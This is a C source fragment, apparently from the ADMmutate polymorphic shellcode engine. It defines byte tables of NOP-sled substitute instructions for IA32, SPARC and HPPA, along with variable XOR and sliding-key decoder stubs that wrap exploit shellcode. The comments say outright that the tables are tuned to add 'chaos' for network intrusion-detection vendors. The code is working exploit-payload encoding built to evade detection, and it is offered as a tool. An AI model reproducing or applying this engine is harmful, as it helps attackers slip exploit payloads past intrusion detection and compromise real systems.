/* ya it's ugly, but it's my ugly :) */
/* this is so I dont have to exhaustivly keep scanning for legal int's (-l/-U/banned)*/
unsigned int good_keys[1<<16];  /* big eh 1@!@$ */
unsigned int nkeys=0;
char *mutupperset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
char *mutlowerset = "abcdefghijklmnopqrstuvwxyz";
int *new; /* used for sorting instruction's */
int rndlist[WINT];

/* thank you HP */
#define permute21(y)  \
((((y) & 0x7C) << 14) | (((y) & 0x180) << 7) | (((y) & 0x3) << 12) | \
(((y) & 0xFFE00) >> 8) | (((y) & 0x100000) >> 20))
#define hi(word)  permute21((unsigned long) (word) >> 11)
#define lo(word)  (((unsigned long) (word) & 0x7FF) << 1)

/* private functions */
int mutate_fixup(char *eng_space, size_t enc_amount, size_t tlen, struct morphctl mut);
int mutate_slide(char *workspc, size_t enc_amount, struct morphctl *mut);
int mutate_encode(char *workspc, size_t enc_amount, struct morphctl *mut, int step);
unsigned int dsrand(unsigned int seed);
unsigned int get_count();
int *rnd_srt(struct morphctl mut);

/*
 these are 0x90 alternatives, this struct is getting big YAY@^$(&@
 all \x42 are dynamic, these are psudo-randomly called, I just thought I'd
 mix em up a lil just incase, tune the weight to maintain some
 chaos for nIDS vend0r :) BTW: I havent had time to test out each and every
 OP here, some may be problematic :\
 
 There are 55 sutable 1 byte NOP replacements, about 1/5'th the address space
 (of a byte), available. if you add any remember to update ADMmutapi.h
 
 Tune the last byte in the junk struct to add to the frequency (weight) of this
 code appearing in the generated nop slead
*/
struct junks intel_njunk[IA32_JUNKS] = {
/* these may be dangerious depending on your sploit */
   { "\x50",1,1,0,1,0,0,0,1 },         /* push %eax  "P" */
   { "\x51",1,1,0,1,0,0,0,1 },         /* push %ecx  "Q" */
   { "\x52",1,1,0,1,0,0,0,1 },         /* push %edx  "R" */
   { "\x53",1,1,0,1,0,0,0,1 },         /* push %ebx  "S" */
   { "\x54",1,1,0,1,0,0,0,1 },         /* push %dsp  "T" */
   { "\x55",1,1,0,1,0,0,0,1 },         /* push %ebp  "U" */
   { "\x56",1,1,0,1,0,0,0,1 },         /* push %esi  "V" */
   { "\x57",1,1,0,1,0,0,0,1 },         /* push %edi  "W" */
   { "\x58",1,1,0,1,0,0,0,1 },         /* pop %eax   "X" */
   { "\x59",1,1,0,1,0,0,0,1 },         /* pop %ecx   "Y" */
   { "\x5a",1,1,0,1,0,0,0,1 },         /* pop %edx   "Z" */
   { "\x5b",1,1,0,1,1,0,0,1 },         /* pop %ebx   "[" */
   { "\x5d",1,1,0,1,1,0,0,1 },         /* pop %ebp   "]" */
   { "\x5e",1,1,0,1,1,0,0,1 },         /* pop %esi   "^" */
   { "\x5f",1,1,0,1,1,0,0,1 },         /* pop %edi   "_" */
   { "\x60",1,1,0,1,1,0,0,1 },         /* pusha      "`" */
   { "\x9b",1,1,1,1,1,0,0,1 },         /* fwait          */
   { "\x9c",1,1,1,1,1,0,0,1 },         /* pushf          */
   { "\x9e",1,1,1,1,1,0,0,1 },         /* safh           */
/* dangerious opcodes section over */
   { "\x99",1,1,1,1,1,0,0,1 },         /* cltd           */
   { "\x96",1,1,0,1,1,0,0,1 },         /* xchg %eax,%esi */
   { "\x97",1,1,0,1,1,0,0,1 },         /* xchg %eax,%edi */
   { "\x95",1,1,0,1,1,0,0,1 },         /* xchg %eax,%ebp */
   { "\x93",1,1,0,1,1,0,0,1 },         /* xchg %eax,%ebx */
   { "\x91",1,1,0,1,1,0,0,1 },         /* xchg %eax,%ecx */
   { "\x90",1,0,1,1,1,0,0,1 },         /* regular NOP    */
   { "\xc1\xe8\x42",3,0,1,1,1,1,2,1 }, /* shr N,%eax     */
   { "\x4d",1,1,0,1,0,0,0,1 },         /* dec %ebp,  "M" */
   { "\x6b\xc0\x42",3,0,1,1,1,1,2,1 }, /* imul N,%eax    */
   { "\x48",1,1,1,1,0,0,0,1 },         /* dec %eax,  "H" */
   { "\x33\xc0",2,0,1,1,1,0,0,1 },     /* xor %eax,%eax  */
   { "\x47",1,1,1,1,0,0,0,1 },         /* inc %edi   "G" */
   { "\x4f",1,1,1,1,0,0,0,1 },         /* dec %edi   "O" */
   { "\x40",1,1,1,1,1,0,0,1 },         /* inc %eax   "@" */
   { "\x8c\xc0",2,0,1,1,1,0,0,1 },     /* mov %es,%eax   */
   { "\x41",1,1,0,1,0,0,0,1 },         /* inc %ecx   "A" */
   { "\x37",1,1,1,1,1,0,0,1 },         /* aaa        "7" */
   { "\x3f",1,1,1,1,1,0,0,1 },         /* aas        "?" */
   { "\x97",1,1,1,1,1,0,0,1 },         /* xchg %eax,%edi */
   { "\x46",1,1,0,1,0,0,0,1 },         /* inc %esi   "F" */
   { "\x4e",1,1,0,1,0,0,0,1 },         /* dec %esi   "N" */
   { "\xf8",1,1,1,1,1,0,0,1 },         /* clc            */
   { "\x92",1,1,1,1,1,0,0,1 },         /* xchg %eax,%edx */
   { "\xfc",1,1,1,1,1,0,0,1 },         /* cld            */
   { "\x87\xdb",2,0,1,1,1,0,0,1 },     /* xchg %ebx,%ebx */
   { "\x98",1,1,1,1,1,0,0,1 },         /* cwtl           */
   { "\x27",1,1,1,1,1,0,0,1 },         /* daa        "'" */
   { "\x87\xc9",2,0,1,1,1,0,0,1 },     /* xchg %ecx,%ecx */
   { "\x2f",1,1,1,1,1,0,0,1 },         /* das        "/" */
   { "\x9f",1,1,1,1,1,0,0,1 },         /* lahf           */
   { "\x87\xd2",2,0,1,1,1,0,0,1 },     /* xchg %edx,%edx */
   { "\xf9",1,1,1,1,1,0,0,1 },         /* stc            */
   { "\x83\xf0\x42",3,0,1,1,1,1,2,1 }, /* xor N,%eax     */
   { "\x4a",1,1,0,1,0,0,0,1 },         /* dec %edx   "J" */
   { "\x8c\xe0",2,0,1,1,1,0,0,1 },     /* mov %fs,%eax   */
   { "\x44",1,1,0,1,0,0,0,1 },         /* inc %esp   "D" */
   { "\xc1\xc0\x42",3,0,1,1,1,1,2,1 }, /* rol N,%eax     */
   { "\x42",1,1,0,1,0,0,0,1 },         /* inc %edx   "B" */
   { "\x83\xfb\x42",3,0,0,1,1,1,2,1 }, /* cmp N,%ebx     */
   { "\x85\xc0",2,0,1,1,1,0,0,1 },     /* test %eax,%eax */
   { "\xc1\xc8\x42",3,0,1,1,1,1,2,1 }, /* ror N,%eax     */
   { "\x43",1,1,0,1,0,0,0,1 },         /* inc %ebx   "C" */
   { "\x83\xc8\x42",3,0,1,1,1,1,2,1 }, /* or  N,%eax     */
   { "\x49",1,1,0,1,0,0,0,1 },         /* dec %ecx   "I" */
   { "\x83\xe8\x42",3,0,1,1,1,1,2,1 }, /* sub N,%eax     */
   { "\x4b",1,1,0,1,0,0,0,1 },         /* dec %ebx   "K" */
   { "\x83\xfa\x42",3,0,0,1,1,1,2,1 }, /* cmp N,%edx     */
   { "\xf7\xd0",2,0,1,1,1,0,0,1 },     /* not %eax       */
   { "\x83\xf9\x42",3,0,0,1,1,1,2,1 }, /* cmp N,%ecx     */
   { "\x8c\xe8",2,0,1,1,1,0,0,1 },     /* mov %gs,%eax   */
   { "\xf5",1,1,1,1,1,0,0,1 },         /* cmc            */
   { "\x83\xe0\x42",3,0,1,1,1,1,2,1 }, /* and N,%eax     */
   { "\xb0\x42",2,0,1,1,1,1,1,1 },     /* mov N,%eax     */
   { "\x45",1,1,0,1,0,0,0,1 },         /* inc %ebp   "E" */
   { "\x83\xf8\x42",3,0,1,1,1,1,2,1 }, /* cmp N,%eax     */
   { "\x4c",1,1,0,1,0,0,0,1 },         /* dec %esp   "L" */
   { "\x83\xc0\x42",3,0,1,1,1,1,2,1 }  /* add N,%eax, N (\x42) will be dynamically loaded from good_keys (aka. list of char that are allowd) */
};

/* here are the sparc junks, we'll sort more out later */
struct junks sparc_njunk[SPARC_JUNKS] = {
   { "\xa2\x1c\x80\x12",4,1,1,1,1,0,0,1 },      /* xor %l2,%l2,%l1   */
   { "\xb6\x06\x40\x1a",4,1,1,1,1,0,0,1 },      /* add %i1,%i2,%i3   */
   { "\xa0\x26\xe0\x42",4,1,1,1,1,1,3,1 },      /* sub %i3,0x42,%l0  */
   { "\xb6\x16\x40\x1a",4,1,1,1,1,0,0,1 },      /* or  %i1,%i2,%i3   */
   { "\xb2\x03\x60\x42",4,1,1,1,1,1,3,1 },      /* add %o5,0x42,%i1  */
   { "\xb6\x04\x80\x12",4,1,1,1,1,0,0,1 },      /* add %l2,%l2,%i3   */
   { "\xa4\x04\xe0\x42",4,1,1,1,1,1,3,1 },      /* add %l3,0x42,%l2  */
   { "\x96\x23\x60\x42",4,1,1,1,1,1,3,1 },      /* sub %o5,0x42,%o3  */
   { "\x96\x24\x80\x12",4,1,1,1,1,0,0,1 },      /* sub %l2,%l2,%o3   */
   { "\xb2\x26\x80\x19",4,1,1,1,1,0,0,1 },      /* sub %i2,%i1,%i1   */
   { "\x89\xa5\x08\x22",4,1,1,1,1,0,0,1 },      /* fadds %f20,%f2,%f4*/
   { "\xa2\x1a\x40\x0a",4,1,1,1,1,0,0,1 },      /* xor %o1,%o2,%l1   */
   { "\x81\xd0\x20\x42",4,1,0,1,1,1,3,1 },      /* tn random         */
   { "\xa4\x32\xa0\x42",4,1,1,1,1,1,3,1 },      /* orn %o2,0x42,%l2  */
   { "\xa2\x03\x40\x12",4,1,1,1,1,0,0,1 },      /* add %o5,%l2,%l1   */
   { "\xba\x56\xa0\x42",4,1,1,1,1,1,3,1 },      /* umul %i2,0x42,%i5 */
   { "\xa4\x27\x40\x12",4,1,1,1,1,0,0,1 },      /* sub %i5,%l2,%l2   */
   { "\xa2\x0e\x80\x13",4,1,1,1,1,0,0,1 },      /* and %i2,%l3,%l1   */
   { "\xb6\x03\x60\x42",4,1,1,1,1,1,3,1 },      /* add %o5,0x42,%i3  */
   { "\x98\x3e\x80\x12",4,1,1,1,1,0,0,1 },      /* xnor %i2,%l2,%o4  */
   { "\x20\xbf\xbf\x42",4,1,0,1,1,1,3,1 }       /* bn -random        */
};

/* I'm getting lazyier with each arch :), add more later */
struct junks hppa_njunk[HPPA_JUNKS] = {
   { "\x08\x41\x02\x83",4,1,1,1,0,0,0,1 },      /* xor %r1,%r2,%r3         */
   { "\x08\x21\x02\x9a",4,1,1,1,1,0,0,1 },      /* xor %r1,%r1,%r26        */
   { "\x09\x6a\x02\x8c",4,1,1,1,1,0,0,1 },      /* xor %r10,%r11,%12       */
   { "\xb5\x03\xe0\x84",4,1,1,1,1,1,3,1 },      /* addi,OD 0x42,%r8,%r3    */
   { "\x09\xcd\x06\x0f",4,1,1,1,1,0,0,1 },      /* add %r13,%r14,%r15      */
   { "\x94\x6c\xe0\x84",4,1,1,1,1,1,3,1 },      /* subi,OD 0x42,%r3,%r12   */
   { "\x09\x09\x04\x07",4,1,1,1,1,0,0,1 },      /* sub %r9,%r8,%r7         */
   { "\xd0\xe8\x0a\xe9",4,1,1,1,1,0,0,1 },      /* shrpw %r8,%r7,8,%r9     */
   { "\x09\x04\x06\x8f",4,1,1,1,1,0,0,1 },      /* shladd %r4,2,%r8,%r15   */
   { "\x08\xa4\x02\x46",4,1,1,1,1,0,0,1 },      /* or  %r4,%r5,%r6         */
   { "\xb5\x4b\xe0\x84",4,1,1,1,0,1,3,1 }       /* addi,OD 0x42,%r10,%r11  */
};

/* 
   All decoders are limited to 32 operational instructions, will be bumpted up if
   there is a good requirement
*/

/* EVERY!!! instruction in the decoder is variable */
struct decoder intel_morpheng[IA32_DECINST] = {
   { 1,1,0,0,0,1,{"\xeb\x42"}},               /* value will be set where to jmp */
   { 4,2,0,0,2,1,{ "\x58\x96","\x58\x89\xc6","\x8b\x34\x24\x83\xec\x04","\x5e"}},
   { 2,12,0,1,0,1,{"\xbb\x42\x42\x42\x42","\x68\x42\x42\x42\x42\x5b"}}, /* key will be memset later */
   { 2,12,0,0,0,1,{"\x31\xc9","\x31\xc0\x91"}},
   { 4,16,0,1,1,1,{"\xb1\x42","\x6a\x42\x66\x59","\x6a\x42\x58\x89\xc1","\xb1\x42"}}, /* counter for loop will be set later, \xb1\x42 had to be used 2x on account of how I manage upper/lower codes in this struct */
   { 3,32,0,0,0,1,{"\x31\x1e","\x93\x31\x06\x93","\x8b\x06\x09\xd8\x21\x1e\xf7\x16\x21\x06"}},
   { 3,960,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 3,960,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 3,960,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 3,960,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 1,1024,0,0,0,1,{"\xe2\x42"}},               /* value will be set where to loop */
   { 1,2048,0,0,0,1,{"\xeb\x42"}},               /* value will be set where to jmp */
   { 1,4096,0,0,0,1,{"\xe8\x42\xff\xff\xff"}}    /* value will be set where to call, has to be just one path here */
};


/* IA32 Sliding key xor decoder */
struct decoder intel_morpheng_slide[IA32_DECINST_SLIDE] = {
   { 1,1,0,0,0,1,{"\xeb\x42"}},               /* value will be set where to jmp */
   { 4,2,0,0,2,1,{ "\x58\x96","\x58\x89\xc6","\x8b\x34\x24\x83\xec\x04","\x5e"}},
   { 2,12,0,1,0,1,{"\xbb\x42\x42\x42\x42","\x68\x42\x42\x42\x42\x5b"}}, /* key will be memset later */
   { 2,12,0,0,0,1,{"\x31\xc9","\x31\xc0\x91"}},
   { 4,16,0,1,1,1,{"\xb1\x42","\x6a\x42\x66\x59","\x6a\x42\x58\x89\xc1","\xb1\x42"}}, /* counter for loop will be set later, \xb1\x42 had to be used 2x on account of how I manage upper/lower codes in this struct */
   { 3,32,0,0,0,1,{"\x31\x1e","\x93\x31\x06\x93","\x8b\x06\x09\xd8\x21\x1e\xf7\x16\x21\x06"}},
   { 1,64,0,0,0,1,{"\x81\xc3\x42\x42\x42\x42"}},
   { 3,1920,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 3,1920,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 3,1920,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 3,1920,0,0,2,1,{"\x46","\x83\xc6\x01","\x96\x40\x96"}},
   { 1,2048,0,0,0,1,{"\xe2\x42"}},               /* value will be set where to loop */
   { 1,4096,0,0,0,1,{"\xeb\x42"}},               /* value will be set where to jmp */
   { 1,8192,0,0,0,1,{"\xe8\x42\xff\xff\xff"}}    /* value will be set where to call, has to be just one path here */
};

/* sparc decoder, maby add more instructions later */
struct decoder sparc_morpheng[SPARC_DECINST] = {
   { 1,3,0,0,0,0,{"\x20\xbf\x42\x42"}}, 
   { 1,3,0,0,0,0,{"\x20\xbf\x42\x42"}}, 
   { 1,4,0,0,0,1,{"\x7f\xff\xff\xff"}}, 
   { 1,120,0,0,0,1,{"\x2b\x42\x42\x42"}}, 
   { 1,120,0,0,0,1,{"\xaa\x15\x42\x42"}}, 
   { 1,120,0,0,0,1,{"\xae\x03\xe0\x42"}}, /* length down to shellcodez */
   { 3,120,0,0,0,1,{"\xa8\x1b\x40\x0d","\xa8\x1c\xc0\x13","\xa8\x1a\x80\x0a"}},
   { 1,128,0,0,0,1,{"\xec\x05\xe0\x04"}}, 
   { 1,768,0,0,0,1,{"\xa8\x05\x20\x01"}}, 
   { 2,768,0,0,0,1,{"\xac\x1d\x80\x15","\xa6\x1d\x40\x16\xac\x14\xc0\x13"}}, 
   { 1,1024,0,0,0,1,{"\xec\x25\xe0\x04"}}, 
   { 2,2048,0,0,0,1,{"\xae\x05\xe0\x04","\xae\x25\xff\xfc"}},
   { 1,4096,0,0,0,1,{"\x80\xa5\x20\x42"}}, /* length to encode * 4 */
   { 1,8192,0,0,0,0,{"\x04\xbf\xff\x42"}}, /* length backwards to loop: */ 
   { 1,16384,0,0,0,0,{"\x81\xdd\xff\xfc"}}
};

/* 
   there is no way to flush/sync modified codez w/o creating NULL in the opcode's
   so i fork(); right after the decode
*/
struct decoder hppa_morpheng[HPPA_DECINST] = {
   { 1,3,0,0,0,1,{"\x22\x42\x42\x42"}},      /* ldil    L'cipher,%r19 */
   { 1,3,0,0,0,1,{"\x36\x73\x42\x42"}},      /* ldo     R'cipher(%r19),%r19 */
   { 1,4,0,0,0,1,{"\xeb\xff\x1f\xfd"}},      /* bl      .+4,%r31 */
   { 1,24,0,0,0,1,{"\x34\x15\x3f\x42"}},     /* ldi     -0x42,%r21 ; amount to encode */
   { 1,24,0,0,0,1,{"\xb7\xf4\xe0\x42"}},     /* addi,OD 0x29,%r31,%r20 ; length down to encoded data */
   { 1,32,0,0,0,1,{"\xb6\xb5\xe0\x02"}},     /* loop: addi,OD 0x1,%r21,%r21 */
   { 1,64,0,0,0,1,{"\x0e\x80\x10\x98"}},     /* ldw     0(%r20),%r24 */
   { 1,128,0,0,0,1,{"\x0b\x13\x02\x97"}},    /* xor     %r19,%r24,%r23 */
   { 1,256,0,0,0,1,{"\x0e\x97\x12\x80"}},    /* stw     %r23,0(%r20) */
   { 1,512,0,0,0,1,{"\x80\x15\x5f\x42"}},    /* cmpb,<  %r21,%r0,loop */
   { 1,1024,0,0,0,1,{"\xb6\x94\xe0\x08"}},   /* addi,OD 0x4,%r20,%r20 */
   { 1,2048,0,0,0,1,{"\x0a\xd6\x02\x96"}},   /* xor     %r22,%r22,%r22 */
   { 1,4096,0,0,0,1,{"\x20\x20\x08\x01"}},   /* ldil    L'0xC0000004,%r1 */
   { 1,8192,0,0,0,0,{"\xe4\x20\xe0\x08"}},   /* ble     R'0xC0000004(%sr7,%r1) */
   { 1,16384,0,0,0,0,{"\xb6\xd6\xe0\x04"}}   /* addi,OD 0x2,%r22,%r22 */
};
